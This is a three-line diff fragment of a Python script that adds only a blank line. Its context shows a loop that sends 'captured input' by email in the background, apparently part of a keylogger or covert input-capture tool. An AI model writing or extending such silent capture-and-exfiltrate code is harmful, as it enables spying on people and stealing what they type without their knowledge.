@@ -98,3 +98,4 @@ while True:
     
     # Send email with the captured input in the background
     send_email_in_background(body)
+
